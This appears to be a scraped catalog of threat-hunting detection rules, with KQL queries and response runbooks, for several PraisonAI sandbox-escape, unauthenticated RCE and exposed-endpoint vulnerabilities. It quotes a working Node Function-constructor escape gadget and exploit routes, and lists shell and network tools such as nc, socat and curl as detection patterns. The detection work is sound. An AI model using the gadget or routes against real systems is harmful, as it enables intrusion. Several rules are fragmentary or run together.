PraisonAI codeMode Function-constructor prototype-chain escape payload signature AIExploitation High
Hunts the exact JavaScript escape primitive used to break out of codeMode's fake sandbox: the prototype-chain recovery of the real Function constructor (`({}).constructor.constructor('return process')()`) combined with `process.mainModule.require`. When this payload transits a command line, application/syslog stream, or captured request body it is a near-zero-FP indicator of an attempted codeMode (or any Node vm/new Function) sandbox escape. Rationale: Targets the literal escape gadget the advisory documents (`({}).constructor.constructor('return process')()` -> `process.mainModule.require`), which the blocklist never covers; the two-token pairing (constructor.constructor + mainModule/return process) makes legitimate occurrence vanishingly rare. Datadog uses case-insensitive full-text phrase search so no casing enumeration is needed. Cross-checked against public Node vm/new Function escape research confirming the same gadget. Cross-checked against: • https://github.com/advisories/GHSA-vmmj-pfw7-fjwp • https://advisories.gitlab.com/npm/praisonai/GHSA-vmmj-pfw7-fjwp/ • https://thegoodhacker.com/posts/the-unsecure-node-vm-module/ • https://architecture.pub/articles/410978448.html
ATT&CKT1059.007 T1211
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • SAST/dependency scanners or pentest tooling replaying the advisory PoC against your own apps
  • The PraisonAI regression/PoV test (poc/pov_poc.js) executing in CI or a developer sandbox
  • Security researchers or red team validating GHSA-vmmj-pfw7-fjwp in a lab
  • Application logs verbosely echoing a blocked/sanitised request body that contained the payload
  • Developer documentation or a blog/notebook about Node sandbox escapes being opened/built on the host
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("pov_poc.js","semgrep","trivy","grype","npm test","jest","mocha") or FolderPath has_any ("/poc/","\\test\\","/test/","node_modules"))
Response runbook
1) Triage: capture the full payload and its source (which process/log stream, which app endpoint, which user/IP submitted it) and determine whether it reached a live codeMode/vm sink or was logged after being blocked. 2) Contain: block the source IP/user at the agent/tool API, take the affected node service out of rotation, and rotate any secrets present in that process environment (API keys, service tokens). 3) Hunt: correlate with UC1 (node spawning shells) on the same host and time window, review outbound connections from the node process for exfil, confirm praisonai is patched to >=1.7.2, and audit other tool endpoints that funnel user/LLM content into new Function or vm.

| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine

Syslog

PraisonAI UI (aiui) server spawns shell/LOLBin child via unauth MCP connect RCE AIExploitation High
Hunts the post-exploitation execution step of GHSA-p75f-6fp4-p57w: the PraisonAI UI host app (launched via `aiui run` / `praisonai ui` / `praisonai claw`) starting an attacker-chosen local process through the MCP stdio transport. Legitimate MCP stdio servers are npx/uvx/node/python runtimes; a raw shell, touch, curl, wget or nc child of the aiui server is the RCE signature. Rationale: Pivots on the article's exact server-launch strings (`aiui run`, `praisonai ui`, `praisonai claw` from ui.py/claw.py) as the parent and a raw shell/LOLBin child — no legitimate MCP stdio server is a bare shell. Datadog left empty because linux.auditd EXECVE in this tenant exposes no parent-process field to anchor the aiui pivot. Falcon limited to ParentBaseFileName since FDR ProcessRollup2 carries no parent command line. Cross-checked against: • https://github.com/advisories/GHSA-p75f-6fp4-p57w • https://advisories.gitlab.com/pkg/npm/mcp-bridge/GHSA-wvr4-3wq4-gpc5/ • https://www.sysdig.com/blog/cve-2026-44338-praisonai-authentication-bypass-in-under-4-hours-and-the-growing-trend-of-rapid-exploitation • https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-9qhq-v63v-fv3j
ATT&CKT1190 T1059.004 T1059
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A legitimately-configured MCP server whose stdio command is a shell wrapper script (e.g. a `bash -c` launcher around a real MCP binary)
  • Admin/SRE debugging the aiui service from the same process tree (interactive shell under the service)
  • An MCP server config that uses curl/wget to fetch from a package registry on startup
  • Health-check or readiness probe scripts shelling out under the service account
Suppression filter
| where not (FileName in~ ("curl","wget") and ProcessCommandLine has_any ("registry.npmjs.org","pypi.org","ghcr.io","objects.githubusercontent.com"))
Response runbook
1) Triage: pull the full ChildCmd and ParentCmd — confirm the child is a real shell/exfil tool, not an MCP runtime, and check whether the aiui service is internet-exposed (bound 0.0.0.0). 2) Contain: kill the child PID, isolate/cordon the host, and immediately set `AUTH_ENFORCE=true` (or take the UI offline) so /api/mcp/connect is no longer unauthenticated; rotate any secrets readable by the UI service user. 3) Hunt: review proxy/web logs for prior POSTs to /api/mcp/connect, enumerate sibling children of the aiui process, and check for follow-on persistence (cron, systemd units, SSH keys) written by the same account.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessCommandLine has_any ("aiui run","praisonai ui","praisonai claw","create_host_app","build_host_app") or InitiatingProcessFileName =~ "aiui"
| where FileName in~ ("sh","bash","dash","zsh","ksh","fish","busybox","touch","curl","wget","nc","ncat","socat","chmod","base64","whoami","id","uname","cmd.exe","powershell.exe","pwsh.exe","certutil.exe","bitsadmin.exe")
| where not (FileName in~ ("curl","wget") and ProcessCommandLine has_any ("registry.npmjs.org","pypi.org","ghcr.io","objects.githubusercontent.com"))
| project Timestamp, DeviceName, AccountName, ParentCmd = InitiatingProcessCommandLine, ParentImage = InitiatingProcessFolderPath, ChildImage = FolderPath, ChildCmd = ProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessCommandLine has_any ("aiui run","praisonai ui","praisonai claw","create_host_app","build_host_app")
| where TargetProcessName has_any ("/sh","/bash","/dash","/zsh","/ksh","/fish","busybox","touch","curl","wget","/nc","ncat","socat","chmod","base64","whoami","/id","uname","cmd.exe","powershell.exe","pwsh.exe","certutil.exe","bitsadmin.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ParentCmd = ActingProcessCommandLine, ChildImage = TargetProcessName, ChildCmd = TargetProcessCommandLine
| order by TimeGenerated desc

Unauthenticated POST to PraisonAI /api/mcp/connect MCP endpoint AIDelivery Medium
Hunts inbound HTTP requests to the vulnerable PraisonAIUI route `POST /api/mcp/connect` (and `/api/mcp/servers`) exposed by the UI host app on 0.0.0.0 without auth. Surfaces exploitation attempts at the wire level before code executes, complementing the host-side process detection. Rationale: Uses the article's exact route strings `/api/mcp/connect` and `/api/mcp/servers` (registered at praisonaiui/server.py:2769-2770) plus the POST method from the documented PoC request. Defender/Falcon/Datadog/CloudWatch empty because the request body and URI live only in proxy/web-access logs, not in EDR or AWS CloudTrail telemetry in this tenant. Cross-checked against: • https://github.com/advisories/GHSA-p75f-6fp4-p57w • https://advisories.gitlab.com/pkg/npm/mcp-bridge/GHSA-wvr4-3wq4-gpc5/
ATT&CKT1190
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A legitimate operator adding an MCP server through the PraisonAI UI, which issues the same POST /api/mcp/connect from the browser
  • Internal vulnerability scanner or ASM probe hitting the endpoint
  • CI/CD smoke test that exercises the MCP connect route
  • Load balancer / uptime monitor configured to POST to the API path
Response runbook
1) Triage: identify the SourceIP — is it external/untrusted or an internal admin workstation? Correlate the timestamp against UC1 process-spawn alerts on the destination host. 2) Contain: if the source is untrusted, block it at the WAF/proxy and restrict the aiui listener to localhost or behind authenticated reverse proxy (set AUTH_ENFORCE=true). 3) Hunt: pull all requests from that SourceIP, look for repeated POSTs (PoC retries until the process wins scheduling) and any subsequent host-side child-process execution.
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestMethod =~ "POST"
| where RequestURL has "/api/mcp/connect" or RequestURL has "/api/mcp/servers"
| project TimeGenerated, SourceIP, DestinationIP, DestinationPort, RequestMethod, RequestURL, RequestClientApplication, DeviceVendor, DeviceProduct
| order by TimeGenerated desc

PraisonAI MCP RCE proof-of-concept marker file written to /tmp AIExploitation High
High-fidelity IOC detection for active exploitation of GHSA-p75f-6fp4-p57w using the published PoC: creation of the marker files `/tmp/praisonai_host_app_mcp_touch_marker.txt` or `/tmp/pwned-by-ui-mcp` proves the unauthenticated /api/mcp/connect endpoint executed a local command. Catches PoC runs, scanners and lazy operators. Rationale: Uses the two literal artifact paths the article documents — `/tmp/praisonai_host_app_mcp_touch_marker.txt` (PoC marker) and `/tmp/pwned-by-ui-mcp` (exploit-scenario example). These fixed strings have effectively zero legitimate occurrence, so any hit is exploitation. Datadog matches the touch command line (EXECVE) since linux.auditd in this tenant has no file-target field; CloudWatch empty (non-AWS). Cross-checked against: • https://github.com/advisories/GHSA-p75f-6fp4-p57w • https://cyberpress.org/praisonai-vulnerability/
ATT&CKT1190 T1059.004

  • Your own red team / security validation running the public PoC against an internal PraisonAI instance
  • An automated vulnerability scanner that ships the PoC payload
  • A pentest engagement reproducing the advisory
  • A developer reproducing the GHSA locally for patch verification
Response runbook
1) Triage: confirm the writing process (InitiatingProcessFileName/ContextImageFileName) is the aiui/python UI service — if so this is genuine RCE, not a benign coincidence; check whether the host is internet-facing. 2) Contain: isolate the host, kill the aiui service, enforce auth (AUTH_ENFORCE=true) or take the UI offline, and rotate secrets accessible to the service user. 3) Hunt: review web logs for the originating /api/mcp/connect POST and SourceIP, enumerate other children of the aiui process for a real (non-PoC) payload, and check for persistence and outbound C2 from the host.

Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] PraisonAI AgentOS unauthenticated POST /api/chat remote agent invocation
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
PraisonAI AgentOS unauthenticated POST /api/chat remote agent invocation AIExploitation High
Hunts unauthenticated HTTP requests to the AgentOS FastAPI routes POST /api/chat and GET /api/agents that return 200 with no Authorization header — the exact incomplete-fix surface in CVE-2026-40151. A no-auth 200 on these paths means an external client successfully enumerated or drove the deployed agent (triggering its tools, memory, and cost-bearing model calls). Rationale: Uses the article's exact incomplete-fix routes (POST /api/chat, GET /api/agents) and the documented behaviour that no-auth requests return 200 (vs 401 on the hardened sibling control). HttpRequestHeaderAuthorization empty + 200 is the clean true positive for unauthenticated invocation; corroborated by the GHSA, the CVE-2026-40151 record, and public reports of rapid endpoint scanning. Cross-checked against: • https://github.com/advisories/GHSA-892r-p3jq-jp24 • https://radar.offseq.com/threat/cve-2026-40151-cwe-200-exposure-of-sensitive-infor-41548a8f • https://vulnerability.circl.lu/vuln/ghsa-892r-p3jq-jp24 • https://www.sysdig.com/blog/cve-2026-44338-praisonai-authentication-bypass-in-under-4-hours-and-the-growing-trend-of-rapid-exploitation
ATT&CKT1190 T1213
Data sourcesWeb.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Kubernetes liveness/readiness probes GETting /api/agents (UA kube-probe)
  • Cloud load-balancer health checks (ELB-HealthChecker) hitting the route
  • An upstream API gateway that terminated auth at the edge, so the backend log shows no Authorization header
  • CI/CD smoke tests invoking the deployed agent post-deploy
  • Internal developers calling the API directly on a trusted network where auth was intentionally disabled
Suppression filter
| where SrcIpAddr !in ("127.0.0.1","::1") and HttpRequestHeaderUserAgent !has "kube-probe" and HttpRequestHeaderUserAgent !has "ELB-HealthChecker" and HttpRequestHeaderUserAgent !has "GoogleHC"
Response runbook
1) Triage: pull all 200 responses to /api/chat and /api/agents grouped by source IP; confirm whether the caller is external (non-RFC1918, not a known LB/proxy) and whether the Authorization header was absent. Check the AgentOS process owner and what tools/memory the agent wraps. 2) Contain: place the AgentOS listener behind an authenticating reverse proxy or rebind to 127.0.0.1, or block port 8000 at the perimeter immediately; rotate any API keys/secrets the agent had access to. 3) Hunt: review request bodies for /api/chat to identify what messages were sent (data exfiltration, tool abuse), pivot on the source IP across other internet-facing assets, and check for the GET /api/agents enumeration that typically precedes invocation.
ImWebSession
| where TimeGenerated > ago(7d)
| where Url has "/api/chat" or Url has "/api/agents"
| where HttpMethod in~ ("POST","GET")
| where isempty(HttpRequestHeaderAuthorization)   // no bearer token presented
| where HttpStatusCode == 200                      // vulnerable AgentOS returns 200, a patched/proxied one returns 401
| project TimeGenerated, SrcIpAddr, DstIpAddr, DstHostname, Url, HttpMethod, HttpStatusCode, UserAgent=HttpRequestHeaderUserAgent
| sort by TimeGenerated desc

PraisonAI AgentOS process bound to 0.0.0.0:8000 / external inbound connections AIDelivery Medium
Hunts the misconfiguration root cause: a PraisonAI/uvicorn process launched with the default host=0.0.0.0 port=8000 and/or accepting inbound connections from public IPs on 8000. This is the network-exposure precondition that makes the unauthenticated AgentOS routes reachable. Rationale: Anchors on the article's literal config defaults (host="0.0.0.0", port=8000) and the praisonai/AgentOS/AgentApp module names, plus public inbound on 8000. This catches the exposed-listener root cause regardless of whether an exploit request has landed yet — the 0.0.0.0 default is called out as the root cause in the advisory. Cross-checked against: • https://github.com/advisories/GHSA-892r-p3jq-jp24 • https://radar.offseq.com/threat/cve-2026-40151-cwe-200-exposure-of-sensitive-infor-41548a8f
ATT&CKT1190 T1133
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Intentional production deployment with AgentOS on 0.0.0.0 but fronted by an authenticating reverse proxy (the advisory's recommended pattern)
  • Containers binding 0.0.0.0 inside an isolated pod network with no real internet exposure
  • Dev/test instances deliberately reachable on a trusted LAN
  • Public inbound connections that are actually from a known ingress controller / WAF source IP, not real external clients
Suppression filter
| where RemoteIPs !has "10." and InitiatingProcessCommandLine !has "127.0.0.1"
Response runbook
1) Triage: for each hit, determine whether the host is genuinely internet-facing (DeviceInfo IsInternetFacing / public IP) and whether an authenticating proxy sits in front of port 8000. 2) Contain: if exposed without auth, rebind AgentOS to 127.0.0.1 or place it behind a bearer-auth proxy and firewall port 8000; treat as exploitable per CVE-2026-40151 since v4.5.128–v4.6.57 and main are all vulnerable. 3) Hunt: cross-reference with web-log UC1 to see if any unauthenticated /api/chat or /api/agents 200s already occurred against this listener, and inventory other hosts running the same praisonai version.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where ActionType == "InboundConnectionAccepted"
| where LocalPort == 8000
| where RemoteIPType == "Public"
| where InitiatingProcessFileName has_any ("python","python3","python.exe","python3.exe","uvicorn","gunicorn")
| where InitiatingProcessCommandLine has_any ("praisonai","agentos","AgentApp","AgentOS")
| summarize ConnCount=count(), FirstSeen=min(Timestamp), LastSeen=max(Timestamp), RemoteIPs=make_set(RemoteIP, 100) by DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, LocalPort
| order by FirstSeen desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessCommandLine has_any ("praisonai","agentos","AgentApp","AgentOS")
| where ActingProcessCommandLine has "0.0.0.0" or ActingProcessCommandLine has "8000"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName
| sort by TimeGenerated desc

Vulnerable PraisonAI package inventory (CVE-2026-40151, >= 4.2.1 <= 4.6.57) AIReconnaissance Medium
Surfaces hosts with the praisonai / praisonaiagents package installed in the confirmed-vulnerable range (incl. the supposedly-patched v4.5.128 and latest v4.6.57). Used to scope exposure for the unauthenticated AgentOS incomplete-fix advisory. Rationale: Uses the exact CVE id (CVE-2026-40151) and the advisory's confirmed-affected range (>= 4.2.1, <= 4.6.57 — including the falsely-patched 4.5.128 and latest 4.6.57). This is posture scoping: it tells the SOC which assets need the network-exposure and web-log detections applied. Cross-checked against: • https://github.com/advisories/GHSA-892r-p3jq-jp24 • https://vulnerability.circl.lu/vuln/ghsa-892r-p3jq-jp24
ATT&CKT1190
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment

Response runbook
1) Triage: list all hosts running praisonai/praisonaiagents and join against internet-facing status; prioritize any in the 4.2.1–4.6.57 range that also appear in the UC2 exposed-listener results. 2) Contain: since no fixed release exists yet (main still reproduces), apply compensating controls — bind to 127.0.0.1 or front with an authenticating proxy, and firewall port 8000 — rather than relying on a version bump. 3) Hunt: feed the asset list into UC1/UC2 to detect actual unauthenticated invocation, and monitor the advisory for a real fixed version to drive remediation.

Unauthenticated PraisonAI AgentTeam.launch agent invocation via /agents endpoints AIExploitation Medium
Hunts external HTTP requests that hit PraisonAI's unauthenticated AgentTeam.launch()/Agents.launch() routes: GET /{path}/list (agent enumeration), POST /{path} (sequential team invocation) and POST /{path}/{agent_id} (single-agent invocation), defaulting to /agents. Because the launch path registers no auth middleware, every 200 response is by definition unauthenticated agent execution (GHSA-x8cv-xmq7-p8xp, sibling of CVE-2026-44338 / CVE-2026-40151). Rationale: Anchored on the article's concrete route shapes (GET /{path}/list, POST /{path}, POST /{path}/{agent_id}; default path /agents from the PoC) plus the fact that no Authorization parsing exists in the launch path, so any 200 from a public source IP is unauthenticated agent execution. Corroborated by sibling advisories and observed in-the-wild scanning of /agents and /chat. Cross-checked against: • https://github.com/advisories/GHSA-6rmh-7xcm-cpxj • https://www.sysdig.com/blog/cve-2026-44338-praisonai-authentication-bypass-in-under-4-hours-and-the-growing-trend-of-rapid-exploitation • https://gbhackers.com/praisonai-vulnerability-actively-exploited/ • https://advisories.gitlab.com/pkg/pypi/praisonai/CVE-2026-39889/
ATT&CKT1190
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate internal application/front-end calling its own PraisonAI /agents API from a corporate egress IP that resolves as public
  • Authorized API consumers or partner integrations invoking the agent team intentionally
  • Security scanners / ASM tooling (e.g. internal pentest, Nuclei templates) probing /agents/list
  • Uptime monitors polling the documented /health and adjacent routes
  • DAST pipelines in CI hitting the staging endpoint
Suppression filter
| where UserAgents !has_any ("PraisonAI-internal", "uptime-monitor")
Response runbook
1) Triage: Pull the full request set for the offending CIp — confirm whether /agents/list (enumeration) preceded a POST /agents or POST /agents/{id} (invocation), inspect User-Agent and request bodies for prompt-injection or data-exfil markers, and verify the source IP is not a sanctioned consumer. 2) Contain: Put the PraisonAI launch endpoint behind auth or network ACLs immediately (the launch path ships no token check); block the source IP at the WAF/reverse proxy and, if internet-exposed, take the service off 0.0.0.0. 3) Hunt: Review all historical hits on the route shapes, pivot on the host running the server for outbound connections or tool/agent actions triggered by the injected prompts, and confirm whether the deployment is on a patched/hardened build vs. current main.
AppServiceHTTPLogs
| where TimeGenerated > ago(7d)
| where ScStatus == 200
| where (CsMethod == "GET" and tolower(CsUriStem) endswith "/agents/list")
     or (CsMethod == "POST" and tolower(CsUriStem) matches regex @"/agents(/[^/]+)?$")
| where not(ipv4_is_private(CIp))
| summarize Requests = count(), Methods = make_set(CsMethod), Paths = make_set(CsUriStem), UserAgents = make_set(UserAgent, 5), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by CIp, CsHost
| order by Requests desc

Internet-facing Python host running PraisonAI Agents.launch bound to 0.0.0.0 AIDelivery Low
Hunts hosts where a Python/uvicorn process running the PraisonAI agent server accepts inbound connections from public source IPs — the exposure precondition for GHSA-x8cv-xmq7-p8xp, where Agents.launch()/AgentTeam.launch() default-binds to 0.0.0.0 and documentation shows host="0.0.0.0". Surfaces the externally reachable, unauthenticated agent-execution surface before/while it is probed. Rationale: Uses the article's specific exposure facts: launch() default bind host 0.0.0.0 and documented host="0.0.0.0" for remote access, hosted by a Python/uvicorn process, accepting public inbound. Unauthenticated POST to PraisonAI Jobs API /api/v1/runs (agent-exec RCE entry) AIExploitation Medium
Hunts inbound HTTP POSTs to the PraisonAI async-jobs endpoint /api/v1/runs, which queues and executes an attacker-supplied prompt/agent_yaml in the operator's process with no authentication. Any POST to this path from a non-backend source — especially returning HTTP 202 (job queued) — is the load-bearing remote-code-execution entry for GHSA-fq2m-6wqh-x44g. Rationale: Uses the article's exact route (/api/v1/runs), HTTP method (POST), success code (202 queued) and listener port (8005) bound by `python -m praisonai.jobs.server --port=8005`. Corroborated by the sibling PraisonAI unauthenticated-server advisories confirming the same 0.0.0.0-bound, no-auth agent-execution pattern. Cross-checked against: • https://github.com/advisories/GHSA-6rmh-7xcm-cpxj • https://advisories.gitlab.com/pypi/praisonai/CVE-2026-44334/ • https://gbhackers.com/praisonai-vulnerability-actively-exploited/
ATT&CKT1190 T1659
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate application backend submitting jobs to /api/v1/runs from an internal/service IP
  • Uptime/health-check probes hitting the jobs endpoint
  • Load or performance testing of the jobs API from a test harness
  • Internal CI/CD pipeline posting smoke-test jobs
Suppression filter
| where CIp != "" and not ipv4_is_private(CIp)   // keep only external callers; internal backend submits from RFC1918
Response runbook
1) Triage: identify CIp/RemoteIP — is it the known application backend or an external/unexpected host? POSTs returning 202 mean a job was queued and the executor was invoked. 2) Contain: block external reachability to TCP 8005, place authenticated reverse-proxy in front, and upgrade praisonai to a patched release; rotate any LLM/tool API keys exposed in the server's environment. 3) Hunt: on the server host, pivot to UC for `praisonai.jobs.server` spawning shells (RCE manifestation) and review GET /api/v1/runs + /result reads for cross-tenant data theft.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where ActionType == "InboundConnectionAccepted"
| where LocalPort == 8005
| where RemoteIPType == "Public"
| where InitiatingProcessFileName has_any ("python","python3","python.exe","uvicorn","gunicorn")
| where InitiatingProcessCommandLine has_any ("praisonai.jobs.server","praisonai","jobs.server")
| summarize Connections = count(), FirstSeen = min(Timestamp), LastSeen = max(Timestamp) by DeviceName, RemoteIP, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Connections desc
AppServiceHTTPLogs

| where CsMethod == "POST"
| where CsUriStem =~ "/api/v1/runs"
| summarize Requests = count(), Statuses = make_set(ScStatus), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by CIp, CsHost, CsUriStem, CsMethod, UserAgent
| order by Requests desc

PraisonAI Jobs API mass enumeration & result harvesting (/api/v1/runs list + read + delete) AIActions on Objectives Medium
Detects a single source rapidly enumerating and reading the flat InMemoryJobStore via GET /api/v1/runs (lists every job), GET /api/v1/runs/{id}/result (reads any job's full output), and bulk DELETE/cancel to destroy in-flight jobs. There is no tenant partition, so high request volume / many distinct job-id paths from one non-backend IP indicates cross-tenant data theft or DoS. Rationale: Keys on the article's exact list/read/delete routes under /api/v1/runs and the documented flat InMemoryJobStore (no user_id/tenant partition) — many distinct {job_id} paths or bulk DELETE from one IP is the cross-tenant read / DoS shape the advisory describes in impact sections 2 and 3. Cross-checked against: • https://github.com/advisories/GHSA-fq2m-6wqh-x44g • https://github.com/advisories/GHSA-6rmh-7xcm-cpxj
ATT&CKT1213 T1485
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Application backend legitimately polling GET /api/v1/runs/{id} for job completion
  • Operator dashboard listing jobs for a status view
  • Monitoring tool periodically enumerating job state
  • Batch cleanup job that legitimately DELETEs completed runs from the operator's own backend
Suppression filter
| where CIp != "" and not ipv4_is_private(CIp)   // restrict to external sources; sanctioned backend is internal
Response runbook
1) Triage: is the source the sanctioned backend IP, or external/unknown? Inspect the method mix — heavy GET /result = data exfil; heavy DELETE/cancel = DoS of the operator's polling flow. 2) Contain: firewall the endpoint to backend only, enforce auth, and upgrade praisonai; if reads occurred, treat any job outputs (prompts, agent chain-of-thought, retrieved DB/API data) as potentially exposed. 3) Hunt: correlate the same IP against UC1 POST submissions (same actor staging RCE) and review the host process tree for executor child processes.

| where Requests > 50 or DistinctJobPaths > 20 or Deletes > 5   // empirical thresholds: a single backend poller rarely exceeds these in 10m
| order by Requests desc

PraisonAI jobs server (praisonai.jobs.server) spawning shell / network child process AIInstallation High
Detects the in-process job executor — a Python process whose command line contains 'praisonai.jobs.server' — spawning a shell, download, or networking utility. Because attacker-controlled prompts/agent_yaml drive the agent's tools (shell, filesystem, browser) under the operator's service account, the jobs server spawning sh/bash/curl/powershell is the direct manifestation of the unauthenticated RCE. Rationale: Anchors on the article's concrete server entrypoint string 'praisonai.jobs.server' as the process parent and pairs it with shell/network children — a child process under the in-process executor is the high-fidelity signal that an attacker prompt actually executed (the PoC log shows the prompt reaching the framework's invocation step). Cross-checked against: • https://github.com/advisories/GHSA-fq2m-6wqh-x44g • https://advisories.gitlab.com/pypi/praisonai/CVE-2026-44334/ • https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-xcmw-grxf-wjhj
ATT&CKT1059.004 T1059 T1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • An agent legitimately configured with a shell/code-interpreter tool running an operator-authored job
  • In-runtime pip/package install spawning during agent setup
  • Operator running a benign test job that shells out to a local utility
  • Agent browser/automation tool launching curl/wget for a sanctioned data fetch
Suppression filter
| where not (FileName in~ ("python","python3") and ProcessCommandLine has_any ("pip","-m venv","ensurepip"))
Response runbook
1) Triage: read the child ProcessCommandLine and the parent jobs-server cmdline — does the child match any sanctioned tool, or is it reconnaissance/download/reverse-shell? Correlate with UC1/UC2 inbound POSTs from external IPs in the prior minutes. 2) Contain: isolate the host, kill the jobs-server process, block egress, and rotate all credentials in the service environment (LLM/tool API keys). 3) Hunt: review files written by the child, outbound connections from the host, and persistence (cron/systemd/Run keys) created under the service account.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessCommandLine has "praisonai.jobs.server"
| where FileName in~ ("sh","bash","dash","zsh","cmd.exe","powershell.exe","pwsh","curl","wget","nc","ncat","python","python3")
| where not (FileName in~ ("python","python3") and ProcessCommandLine has "pip")   // drop in-runtime pip installs
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, FolderPath, SHA256
| order by Timestamp desc

| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

Exposed PraisonAI jobs server bound to 0.0.0.0 (praisonai.jobs.server --host=0.0.0.0) AIReconnaissance Medium
Inventory/posture hunt that surfaces any host running the PraisonAI async-jobs server with a network-reachable bind (--host=0.0.0.0), the exact exposure the CLI parser suggests and the advisory warns against. Each hit is an unauthenticated agent-execution surface that should be firewalled, fronted with auth, or patched. Rationale: Built directly from the article's documented invocation `python -m praisonai.jobs.server --host=0.0.0.0 --port=8005`; matching both the module string and the 0.0.0.0 bind inventories every exposed, unauthenticated instance — the prerequisite condition for UC1–UC3. Cross-checked against: • https://github.com/advisories/GHSA-fq2m-6wqh-x44g • https://github.com/advisories/GHSA-6rmh-7xcm-cpxj • https://www.csoonline.com/article/4171215/praisonai-vulnerability-gets-scanned-within-4-hours-of-disclosure.html
ATT&CKT1190 T1133
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: high — model-assessed, tune to your environment
  • Containerized deployment intentionally binding 0.0.0.0 but fronted by an authenticated ingress/proxy
  • Developer/test instance run on an isolated host or laptop
  • Internal-only deployment bound 0.0.0.0 but firewalled to the backend subnet
  • Kubernetes pod where 0.0.0.0 bind is the norm and auth is enforced upstream
Response runbook
1) Triage: confirm whether the host is genuinely network-reachable (public IP / open 8005) versus firewalled, and whether any auth proxy sits in front. 2) Contain: restrict 8005 to the backend source only, deploy the package's gateway-style auth_token in front of the jobs API, and upgrade praisonai to a patched release. 3) Hunt: for each exposed instance, back-check UC1 (external POSTs), UC2 (enumeration/deletes), and UC3 (executor spawning shells) over the period it was exposed; treat env-stored LLM/tool keys as potentially compromised.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where ProcessCommandLine has "praisonai.jobs.server"
| where ProcessCommandLine has "0.0.0.0"
| summarize FirstSeen = min(Timestamp), LastSeen = max(Timestamp), arg_max(Timestamp, ProcessCommandLine, FileName, FolderPath) by DeviceName, DeviceId, AccountName
| order by LastSeen desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessCommandLine has "praisonai.jobs.server"
| where ActingProcessCommandLine has "0.0.0.0"
| summarize FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated), SampleCmd = any(ActingProcessCommandLine) by DvcHostname, ActorUsername, ActingProcessName
| order by LastSeen desc

Vulnerable PraisonAI recipe-serve module (fail-open auth middleware) present on host AIExploitation Medium
Hunts for the exact vulnerable praisonai/recipe/serve.py (v4.6.48, sha256 491bf8f2...) whose APIKeyAuthMiddleware/JWTAuthMiddleware silently disable themselves when no secret is configured. Surfaces hosts running the at-risk component so they can be patched or have a secret enforced before the recipe-execution surface is reached unauthenticated. Rationale: Pivots on the article's exact file artifact: sha256 491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23 and path praisonai/recipe/serve.py. Hash match (Defender/Sentinel EDR) confirms the vulnerable 4.6.48 build; path match (Sysmon/FDR, which don't hash on write) is the fallback. Cross-checked against the sibling fail-open advisory CVE-2026-44338 confirming the same package's auth-disabled-by-default class. Cross-checked against: • https://github.com/advisories/GHSA-6rmh-7xcm-cpxj • https://webflow.sysdig.com/blog/cve-2026-44338-praisonai-authentication-bypass-in-under-4-hours-and-the-growing-trend-of-rapid-exploitation • https://docs.praison.ai/docs/deploy/deploy
ATT&CKT1190
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Intentional dev/test sandbox running praisonai where api_key/PRAISONAI_API_KEY is correctly set (vulnerable code present but not exploitable)
  • CI/build pipeline checking out or installing the praisonai package as an artifact
  • Internal red-team / security-research host that installed praisonai deliberately
  • A patched fork where serve.py was edited but the file path is unchanged (hash differs — path-only match)
Suppression filter
// Prioritise exploitable hosts: join to internet-facing inventory
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d) | where IsInternetFacing == true | distinct DeviceId) on DeviceId
Response runbook
